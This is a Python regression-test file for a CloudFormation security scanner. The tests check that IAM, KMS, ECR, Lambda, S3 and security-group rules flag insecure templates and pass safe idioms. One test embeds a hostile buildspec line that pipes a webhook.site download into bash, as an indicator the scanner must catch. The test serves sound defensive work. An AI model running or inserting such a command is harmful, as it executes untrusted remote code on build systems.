"""Regression tests from the rule audit (CloudFormation FP fixes).

Each test pins a false positive the audit found: a documented-safe
CloudFormation idiom that the check used to flag. Grouped here so the
audit's CloudFormation coverage is auditable in one place.
"""
from __future__ import annotations

from pipeline_check.core.checks.cloudformation import phase4
from pipeline_check.core.checks.cloudformation.base import _parse_template
from pipeline_check.core.checks.cloudformation.ecr import ECRChecks
from pipeline_check.core.checks.cloudformation.extended import ExtendedChecks
from pipeline_check.core.checks.cloudformation.phase3 import Phase3Checks
from pipeline_check.core.checks.cloudformation.rules import (
    ca003_domain_policy_public as ca003,
)
from pipeline_check.core.checks.cloudformation.rules import (
    ca004_repo_wildcard_actions as ca004,
)
from pipeline_check.core.checks.cloudformation.rules import (
    cf003_codebuild_public_subnet as cf003,
)
from pipeline_check.core.checks.cloudformation.rules import (
    ecr003_public_policy as ecr003,
)
from pipeline_check.core.checks.cloudformation.rules import (
    ecr006_pull_through_untrusted as ecr006,
)
from pipeline_check.core.checks.cloudformation.rules import (
    iam002_wildcard_action as iam002,
)
from pipeline_check.core.checks.cloudformation.rules import (
    iam004_passrole as iam004,
)
from pipeline_check.core.checks.cloudformation.rules import (
    iam005_external_trust as iam005,
)
from pipeline_check.core.checks.cloudformation.rules import (
    iam006_sensitive_wildcard as iam006,
)
from pipeline_check.core.checks.cloudformation.rules import (
    lmb003_plaintext_env as lmb003,
)
from pipeline_check.core.checks.cloudformation.rules import (
    s3005_secure_transport as s3005,
)
from pipeline_check.core.checks.cloudformation.services import (
    ServiceChecks,
    _principal_is_only_account_root,
)

from .conftest import make_context, r


def _example_contexts(rule):
    """Build (vulnerable_ctx, safe_ctx) from a rule's exploit_example."""
    vuln, safe = rule.exploit_example.split("\n\n", 1)
    return (
        make_context(_parse_template(vuln)["Resources"]),
        make_context(_parse_template(safe)["Resources"]),
    )


def _find(ctx, check_id: str):
    return [f for f in ServiceChecks(ctx).run() if f.check_id == check_id]


class TestKMS002AccountRootBaseline:
    def test_account_root_wildcard_passes(self):
        # kms:* granted to arn:...:root is the AWS-recommended default
        # key policy (it lets IAM policies govern access), not a finding.
        ctx = make_context({"K": r("K", "AWS::KMS::Key", {"KeyPolicy": {
            "Statement": [{"Sid": "Enable IAM", "Effect": "Allow",
                "Principal": {"AWS": "arn:aws:iam::123456789012:root"},
                "Action": "kms:*", "Resource": "*"}]}})})
        f = _find(ctx, "KMS-002")
        assert f and f[0].passed is True

    def test_fn_sub_account_root_recognized(self):
        # The root principal is often written via Fn::Sub.
        assert _principal_is_only_account_root({"Principal": {"AWS": {
            "Fn::Sub": "arn:aws:iam::${AWS::AccountId}:root"}}}) is True

    def test_non_root_wildcard_still_fires(self):
        ctx = make_context({"K": r("K", "AWS::KMS::Key", {"KeyPolicy": {
            "Statement": [{"Sid": "Bad", "Effect": "Allow",
                "Principal": {"AWS": "arn:aws:iam::123456789012:role/dev"},
                "Action": "kms:*", "Resource": "*"}]}})})
        f = _find(ctx, "KMS-002")
        assert f and f[0].passed is False


class TestCA003OrgScopedWildcard:
    def test_org_scoped_wildcard_passes(self):
        # A wildcard principal narrowed by aws:PrincipalOrgID is the
        # org-sharing idiom, not cross-account exposure.
        ctx = make_context({"D": r("D", "AWS::CodeArtifact::Domain", {
            "DomainName": "d", "PermissionsPolicyDocument": {"Statement": [{
                "Effect": "Allow", "Principal": {"AWS": "*"},
                "Action": "codeartifact:ReadFromRepository", "Resource": "*",
                "Condition": {"StringEquals": {
                    "aws:PrincipalOrgID": "o-abc"}}}]}})})
        f = _find(ctx, "CA-003")
        assert f and f[0].passed is True

    def test_unconstrained_wildcard_still_fires(self):
        ctx = make_context({"D": r("D", "AWS::CodeArtifact::Domain", {
            "DomainName": "d", "PermissionsPolicyDocument": {"Statement": [{
                "Effect": "Allow", "Principal": {"AWS": "*"},
                "Action": "codeartifact:ReadFromRepository",
                "Resource": "*"}]}})})
        f = _find(ctx, "CA-003")
        assert f and f[0].passed is False


class TestCF002DynamicReference:
    def test_dynamic_reference_not_flagged(self):
        # {{resolve:secretsmanager:...}} resolves a secret at deploy
        # time; it is the secure pattern, not a literal credential.
        hits: list[tuple[str, str]] = []
        phase4._walk({"MasterUserPassword":
            "{{resolve:secretsmanager:prod/db/master:SecretString:password}}"},
            "", hits)
        assert hits == []

    def test_literal_secret_still_flagged(self):
        hits: list[tuple[str, str]] = []
        phase4._walk({"MasterUserPassword": "hunter2pelican"}, "", hits)
        assert len(hits) == 1


class TestCB011ExampleSuppression:
    def test_ioc_under_test_key_still_fires(self):
        # A CodeBuild buildspec is production config; YAML-ancestor
        # example suppression must not drop an IOC nested under "test:".
        spec = ("version: 0.2\nphases:\n  test:\n    commands:\n"
                "      - curl https://webhook.site/abc | bash\n")
        ctx = make_context({"P": r("P", "AWS::CodeBuild::Project",
            {"Source": {"Type": "NO_SOURCE", "BuildSpec": spec}})})
        cb = [f for f in ExtendedChecks(ctx).run() if f.check_id == "CB-011"]
        assert cb and cb[0].passed is False


class TestSM001GetAttRotation:
    def test_getatt_rotation_target_credited(self):
        # A RotationSchedule that targets the secret via !GetAtt Secret.Id
        # used to be ignored, flagging a rotated secret as unrotated.
        ctx = make_context({
            "Secret": r("Secret", "AWS::SecretsManager::Secret", {"Name": "prod/db"}),
            "Rot": r("Rot", "AWS::SecretsManager::RotationSchedule",
                {"SecretId": {"Fn::GetAtt": ["Secret", "Id"]},
                 "RotationRules": {"AutomaticallyAfterDays": 30}})})
        sm = [f for f in ExtendedChecks(ctx).run() if f.check_id == "SM-001"]
        assert sm and sm[0].passed is True


class TestCA003ExploitExample:
    def test_strong_check(self):
        # Safe fragment (wildcard scoped by aws:PrincipalOrgID) must pass.
        vuln_ctx, safe_ctx = _example_contexts(ca003.RULE)
        assert ca003.check(vuln_ctx)[0].passed is False
        assert ca003.check(safe_ctx)[0].passed is True


class TestCA004ExploitExample:
    def test_strong_check(self):
        # The CFN CA-004 variant previously had only a firing-side test
        # (a wildcard action+resource fails); no test pinned that a
        # properly scoped CodeArtifact repository policy PASSES. The
        # exploit_example's Safe fragment scopes both, so it must pass
        # while the Vulnerable fragment fires.
        vuln_ctx, safe_ctx = _example_contexts(ca004.RULE)
        assert ca004.check(vuln_ctx)[0].passed is False
        assert ca004.check(safe_ctx)[0].passed is True


class TestLMB003ExploitExample:
    def test_strong_check(self):
        # Safe fragment (env vars hold !Ref secret ARNs, not plaintext)
        # must pass despite the secret-like names.
        vuln_ctx, safe_ctx = _example_contexts(lmb003.RULE)
        assert lmb003.check(vuln_ctx)[0].passed is False
        assert lmb003.check(safe_ctx)[0].passed is True


# ---------------------------------------------------------------------------
# Batch-3 exploit_example fixes
# ---------------------------------------------------------------------------


class TestS3005ExploitExample:
    def test_strong_check(self):
        # Vulnerable: pipeline bucket with no SecureTransport deny fires.
        # Safe: bucket policy with the deny passes.
        vuln_ctx, safe_ctx = _example_contexts(s3005.RULE)
        vuln = [f for f in s3005.check(vuln_ctx) if f.check_id == "S3-005"]
        safe = [f for f in s3005.check(safe_ctx) if f.check_id == "S3-005"]
        assert vuln and vuln[0].passed is False
        assert safe and safe[0].passed is True


class TestCF003ExploitExample:
    def test_strong_check(self):
        # Vulnerable: CodeBuild in a public subnet fires.
        # Safe: private subnet passes.
        vuln_ctx, safe_ctx = _example_contexts(cf003.RULE)
        vuln = cf003.check(vuln_ctx)
        safe = cf003.check(safe_ctx)
        assert any(not f.passed for f in vuln)
        assert all(f.passed for f in safe)


class TestECR003ExploitExample:
    def test_strong_check(self):
        # Vulnerable: wildcard principal fires.
        # Safe: specific account principal passes.
        vuln_ctx, safe_ctx = _example_contexts(ecr003.RULE)
        vuln = [f for f in ecr003.check(vuln_ctx) if f.check_id == "ECR-003"]
        safe = [f for f in ecr003.check(safe_ctx) if f.check_id == "ECR-003"]
        assert vuln and vuln[0].passed is False
        assert safe and safe[0].passed is True


class TestECR006ExploitExample:
    def test_strong_check(self):
        # Vulnerable: untrusted upstream fires.
        # Safe: public.ecr.aws (trusted, bare host) passes.
        vuln_ctx, safe_ctx = _example_contexts(ecr006.RULE)
        vuln = ecr006.check(vuln_ctx)
        safe = ecr006.check(safe_ctx)
        assert any(not f.passed for f in vuln)
        assert all(f.passed for f in safe)


class TestIAM002ExploitExample:
    def test_strong_check(self):
        # Vulnerable: Action:'*' in a CI/CD role fires.
        # Safe: scoped actions pass.
        vuln_ctx, safe_ctx = _example_contexts(iam002.RULE)
        vuln = [f for f in iam002.check(vuln_ctx) if f.check_id == "IAM-002"]
        safe = [f for f in iam002.check(safe_ctx) if f.check_id == "IAM-002"]
        assert vuln and vuln[0].passed is False
        assert safe and safe[0].passed is True


class TestIAM004ExploitExample:
    def test_strong_check(self):
        # Vulnerable: iam:PassRole on Resource:'*' fires.
        # Safe: scoped Resource ARNs pass.
        vuln_ctx, safe_ctx = _example_contexts(iam004.RULE)
        vuln = [f for f in iam004.check(vuln_ctx) if f.check_id == "IAM-004"]
        safe = [f for f in iam004.check(safe_ctx) if f.check_id == "IAM-004"]
        assert vuln and vuln[0].passed is False
        assert safe and safe[0].passed is True


class TestIAM005ExploitExample:
    def test_strong_check(self):
        # Vulnerable: external-account trust without sts:ExternalId fires.
        # Safe: same trust with sts:ExternalId passes.
        vuln_ctx, safe_ctx = _example_contexts(iam005.RULE)
        vuln = [f for f in iam005.check(vuln_ctx) if f.check_id == "IAM-005"]
        safe = [f for f in iam005.check(safe_ctx) if f.check_id == "IAM-005"]
        assert vuln and vuln[0].passed is False
        assert safe and safe[0].passed is True


class TestIAM006ExploitExample:
    def test_strong_check(self):
        # Vulnerable: sensitive service prefix on Resource:'*' fires.
        # Safe: scoped Resource ARNs pass.
        vuln_ctx, safe_ctx = _example_contexts(iam006.RULE)
        vuln = [f for f in iam006.check(vuln_ctx) if f.check_id == "IAM-006"]
        safe = [f for f in iam006.check(safe_ctx) if f.check_id == "IAM-006"]
        assert vuln and vuln[0].passed is False
        assert safe and safe[0].passed is True


class TestCCM002KmsIntrinsic:
    """CCM-002: KmsKeyId via intrinsic referencing an in-template KMS resource."""

    def test_ref_to_kms_key_passes(self):
        # KmsKeyId: !Ref MyKey — the standard CFN idiom for a CMK.
        # Used to produce key_str='' and flag as unencrypted (FP).
        ctx = make_context({
            "MyKey": r("MyKey", "AWS::KMS::Key", {"EnableKeyRotation": True}),
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
                "KmsKeyId": {"Ref": "MyKey"},
            }),
        })
        f = _find(ctx, "CCM-002")
        assert f and f[0].passed is True

    def test_getatt_to_kms_key_passes(self):
        # KmsKeyId: !GetAtt MyKey.Arn — another valid CMK reference idiom.
        ctx = make_context({
            "MyKey": r("MyKey", "AWS::KMS::Key", {"EnableKeyRotation": True}),
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
                "KmsKeyId": {"Fn::GetAtt": ["MyKey", "Arn"]},
            }),
        })
        f = _find(ctx, "CCM-002")
        assert f and f[0].passed is True

    def test_ref_to_kms_alias_passes(self):
        # KmsKeyId: !Ref MyAlias — alias is also a CMK reference.
        ctx = make_context({
            "MyAlias": r("MyAlias", "AWS::KMS::Alias", {
                "AliasName": "alias/my-key", "TargetKeyId": "some-key-id",
            }),
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
                "KmsKeyId": {"Ref": "MyAlias"},
            }),
        })
        f = _find(ctx, "CCM-002")
        assert f and f[0].passed is True

    def test_no_kms_key_still_fires(self):
        # A CodeCommit repo with no KmsKeyId must still fail CCM-002.
        ctx = make_context({
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
            }),
        })
        f = _find(ctx, "CCM-002")
        assert f and f[0].passed is False

    def test_aws_owned_alias_still_fires(self):
        # KmsKeyId: alias/aws/codecommit is the AWS-owned key; must still fail.
        ctx = make_context({
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
                "KmsKeyId": "alias/aws/codecommit",
            }),
        })
        f = _find(ctx, "CCM-002")
        assert f and f[0].passed is False

    def test_ref_to_non_kms_resource_does_not_pass(self):
        # !Ref to something that is NOT a KMS resource stays unresolved;
        # the check must not pass (conservative default).
        ctx = make_context({
            "SomeParam": r("SomeRole", "AWS::IAM::Role", {
                "AssumeRolePolicyDocument": {},
            }),
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
                "KmsKeyId": {"Ref": "SomeRole"},
            }),
        })
        f = _find(ctx, "CCM-002")
        assert f and f[0].passed is False


class TestCCM003LiteralArn:
    """CCM-003: literal DestinationArn triggers flag; intrinsic refs pass."""

    def test_literal_arn_fires(self):
        # A literal SNS ARN in DestinationArn must be flagged.
        ctx = make_context({
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
                "Triggers": [{"Name": "t1",
                              "DestinationArn": "arn:aws:sns:us-east-1:123456789012:my-topic",
                              "Events": ["all"]}],
            }),
        })
        f = _find(ctx, "CCM-003")
        assert f and f[0].passed is False

    def test_intrinsic_destination_passes(self):
        # A trigger whose DestinationArn is a Ref (not a literal string)
        # does not produce an offender entry; the finding must pass.
        ctx = make_context({
            "MyTopic": r("MyTopic", "AWS::SNS::Topic", {}),
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
                "Triggers": [{"Name": "t1",
                              "DestinationArn": {"Ref": "MyTopic"},
                              "Events": ["all"]}],
            }),
        })
        f = _find(ctx, "CCM-003")
        assert f and f[0].passed is True

    def test_no_triggers_produces_no_finding(self):
        # When there are no Triggers, CCM-003 emits no finding at all.
        ctx = make_context({
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
            }),
        })
        f = _find(ctx, "CCM-003")
        assert f == []


# ---------------------------------------------------------------------------
# Batch 5 FN fixes
# ---------------------------------------------------------------------------

class TestECR003ListPrincipal:
    """ECR-003 must flag list-form wildcard principals, not just scalar '*'."""

    def _ctx(self, principal):
        policy = {"Statement": [{"Effect": "Allow", "Principal": principal,
                                  "Action": "ecr:GetDownloadUrlForLayer"}]}
        return make_context({"R": r("R", "AWS::ECR::Repository",
                                    {"RepositoryPolicyText": policy})})

    def test_aws_list_wildcard_fires(self):
        # Previously missed: Principal: {AWS: ['*']}
        f = next(x for x in ECRChecks(self._ctx({"AWS": ["*"]})).run()
                 if x.check_id == "ECR-003")
        assert f.passed is False

    def test_bare_list_wildcard_fires(self):
        # Principal: ['*'] (bare list form)
        f = next(x for x in ECRChecks(self._ctx(["*"])).run()
                 if x.check_id == "ECR-003")
        assert f.passed is False

    def test_scalar_wildcard_still_fires(self):
        # Existing true-positive must not regress.
        f = next(x for x in ECRChecks(self._ctx("*")).run()
                 if x.check_id == "ECR-003")
        assert f.passed is False

    def test_specific_account_principal_passes(self):
        # A policy restricted to a specific account ARN must not be flagged.
        f = next(x for x in ECRChecks(self._ctx(
            {"AWS": "arn:aws:iam::123456789012:root"})).run()
                 if x.check_id == "ECR-003")
        assert f.passed is True

    def test_specific_account_list_passes(self):
        # A list of specific account ARNs must not be flagged.
        f = next(x for x in ECRChecks(self._ctx(
            {"AWS": ["arn:aws:iam::123456789012:root"]})).run()
                 if x.check_id == "ECR-003")
        assert f.passed is True


class TestLMB002CrossStackUrl:
    """LMB-002 must fire for AWS::Lambda::Url with a literal cross-stack ARN."""

    def test_cross_stack_arn_none_auth_fires(self):
        # AWS::Lambda::Url with a literal ARN target and AuthType: NONE was
        # previously missed because no local Lambda::Function matched.
        ctx = make_context({"U": r("U", "AWS::Lambda::Url", {
            "TargetFunctionArn": "arn:aws:lambda:us-east-1:111122223333:function:other",
            "AuthType": "NONE",
        })})
        findings = [f for f in ServiceChecks(ctx).run() if f.check_id == "LMB-002"]
        assert findings and findings[0].passed is False

    def test_cross_stack_arn_iam_auth_passes(self):
        # A cross-stack Url with AuthType: AWS_IAM is safe and must not fire.
        ctx = make_context({"U": r("U", "AWS::Lambda::Url", {
            "TargetFunctionArn": "arn:aws:lambda:us-east-1:111122223333:function:other",
            "AuthType": "AWS_IAM",
        })})
        findings = [f for f in ServiceChecks(ctx).run() if f.check_id == "LMB-002"]
        assert findings and findings[0].passed is True

    def test_local_ref_url_no_double_emit(self):
        # A Url that targets a local function via !Ref must not emit two
        # LMB-002 findings (one from the fn-loop, one from the Url-loop).
        ctx = make_context({
            "F": r("F", "AWS::Lambda::Function", {"FunctionName": "fn"}),
            "U": r("U", "AWS::Lambda::Url", {
                "TargetFunctionArn": {"Ref": "F"},
                "AuthType": "NONE",
            }),
        })
        findings = [f for f in ServiceChecks(ctx).run() if f.check_id == "LMB-002"]
        assert len(findings) == 1
        assert findings[0].passed is False


class TestPBAC003IPv6Egress:
    """PBAC-003 must fire for ::/0 all-port egress rules, not just 0.0.0.0/0."""

    def test_ipv6_all_port_egress_fires(self):
        # CidrIpv6: ::/0 with IpProtocol -1 was previously missed.
        ctx = make_context({"SG": r("SG", "AWS::EC2::SecurityGroup", {
            "SecurityGroupEgress": [{
                "IpProtocol": "-1",
                "CidrIpv6": "::/0",
            }],
        })})
        findings = [f for f in Phase3Checks(ctx).run() if f.check_id == "PBAC-003"]
        assert findings and findings[0].passed is False

    def test_ipv4_all_port_egress_still_fires(self):
        # Existing true-positive must not regress.
        ctx = make_context({"SG": r("SG", "AWS::EC2::SecurityGroup", {
            "SecurityGroupEgress": [{
                "IpProtocol": "-1",
                "CidrIp": "0.0.0.0/0",
            }],
        })})
        findings = [f for f in Phase3Checks(ctx).run() if f.check_id == "PBAC-003"]
        assert findings and findings[0].passed is False

    def test_scoped_ipv6_egress_passes(self):
        # An egress rule restricted to a specific IPv6 prefix must not fire.
        ctx = make_context({"SG": r("SG", "AWS::EC2::SecurityGroup", {
            "SecurityGroupEgress": [{
                "IpProtocol": "tcp",
                "FromPort": 443, "ToPort": 443,
                "CidrIpv6": "2001:db8::/32",
            }],
        })})
        findings = [f for f in Phase3Checks(ctx).run() if f.check_id == "PBAC-003"]
        assert not findings or findings[0].passed is True
